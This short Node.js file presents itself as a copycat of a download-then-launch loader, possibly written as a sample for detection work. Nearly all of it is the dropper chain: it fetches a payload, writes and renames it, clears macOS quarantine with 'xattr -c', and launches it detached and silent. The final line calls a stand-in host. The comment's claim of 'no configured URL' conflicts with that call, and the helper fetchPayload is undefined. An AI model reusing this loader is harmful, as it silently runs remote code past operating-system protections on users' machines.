// Copycat of a download-then-launch loader with renamed helpers and no
// configured URL. Each step is a generic primitive: fetch bytes, write a temp
// file, rename it into place, clear quarantine, and start it detached.
const { execFileSync, spawn } = require('child_process');
const { writeFile, rename } = require('fs/promises');

async function stageAndRun(url, bin) {
  const bytes = await fetchPayload(url);
  const tmp = bin + '.part';
  await writeFile(tmp, bytes, { mode: 0o600 });
  await rename(tmp, bin);
  execFileSync('xattr', ['-c', bin]);
  const child = spawn(bin, [], { detached: true, stdio: 'ignore' });
  child.unref();
}

stageAndRun('https://updates.example.test/agent', '/tmp/agent-bin');
